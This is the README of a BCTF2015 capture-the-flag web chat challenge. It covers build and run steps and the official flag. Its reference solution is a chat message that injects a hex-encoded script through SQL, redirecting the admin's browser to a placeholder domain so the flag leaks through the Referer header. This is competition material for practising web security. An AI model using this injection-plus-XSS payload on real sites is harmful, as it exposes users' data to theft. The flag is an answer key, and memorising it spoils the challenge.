# BCTF2015-Webchat
The official implementation of BCTF2015 Webchat Challenge.

## Runtime Dependencies:

1. Erlang/OTP 17
  - 3rd-party libraries: cowboy, cowlib, ranch, emysql
2. xorg-server-xvfb
3. Any browser. (firefox is the default setting, as chrome/chromium doesn't work well in container)
4. MySQL or any other MySQL-compatible database.

## How to build?

Just type `make` and it will download dependencies, and then compile.

## How to run?

```
$ _rel/webchat_release/bin/webchat_release start # background running
$ _rel/webchat_release/bin/webchat_release stop # stop a background running instance
$ _rel/webchat_release/bin/webchat_release foreground  # foreground running
$ _rel/webchat_release/bin/webchat_release console # foreground running with console
```

You can attach to a background running erlang VM using `$ _rel/webchat_release/bin/webchat_release attach` to get a console.


## Offical Flag

BCTF{xss_is_not_that_difficult_right}

## Reference Solution

Send a chat message:
```
'), (0x3C7363726970743E77696E646F772E6C6F636174696F6E3D22687474703A2F2F796F7572646F6D61696E2E636F6D2F6263746632303135223B3C2F7363726970743E), ('
```
which produces a XSS payload in the chatlog, and flag will be found in the HTTP header referer.

## Behind the CTF

### About the spam

I didn't expect there will be so many spam messages to slow down users' browser on this challenge. The server costs less than 10% CPU, and only 
dozens MB memory on a single core Google Cloud Compute configuration when processing a huge amount of spams.

### Original idea is to let team interfere each other

The original idea for this challenge is that the XSS payload will be seen by not only the Admin, but also all active users. So teams will interfere
with each other (being XSSed by other teams, as well as a lot of useless content from other teams in HTTP log when a XSS is triggered). But finally,
we decided not to implement like it but just a chat service that teams can chat each other.

### A wrong database configuration

At the beginning, the database user has the permission to drop table. :-(, 

and it had been dropped.
